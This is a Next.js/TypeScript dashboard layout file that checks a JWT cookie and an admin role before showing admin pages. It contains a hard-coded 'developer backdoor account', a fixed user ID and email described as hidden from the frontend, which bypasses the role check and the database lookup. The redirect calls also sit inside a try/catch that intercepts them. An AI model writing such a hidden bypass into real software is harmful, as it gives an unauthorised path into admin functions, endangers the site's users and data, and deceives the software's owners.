import { redirect } from "next/navigation"
import { cookies } from "next/headers"
import { query } from "@/lib/db"
import { verifyToken } from "@/lib/jwt"

export default async function DashboardLayout({
  children,
}: {
  children: React.ReactNode
}) {
  const cookieStore = await cookies()
  const authToken = cookieStore.get("authToken")?.value

  // Developer backdoor account (hidden from frontend)
  const DEV_ACCOUNT_ID = 999999
  const DEV_ACCOUNT_EMAIL = "sunhawksystem@dev.com"

  if (!authToken) {
    redirect("/login")
  }

  try {
    // Verify JWT token
    const payload = await verifyToken(authToken)
    
    if (!payload) {
      redirect("/login")
    }

    // Check if this is the developer account
    if (payload.userId === DEV_ACCOUNT_ID && payload.email === DEV_ACCOUNT_EMAIL) {
      // Developer account - allow access to dashboard
      return <>{children}</>
    }

    // For regular users, check database
    if (payload.role !== "admin") {
      redirect("/employee-portal")
    }

    // Verify user exists in database (optional check for regular users)
    const result = await query<{ role: string }>(
      "SELECT role FROM users WHERE id = $1",
      [payload.userId]
    )

    if (result.rows.length === 0 || result.rows[0].role !== "admin") {
      redirect("/employee-portal")
    }
  } catch (error) {
    console.error("Dashboard layout auth check error:", error)
    redirect("/login")
  }

  return <>{children}</>
}

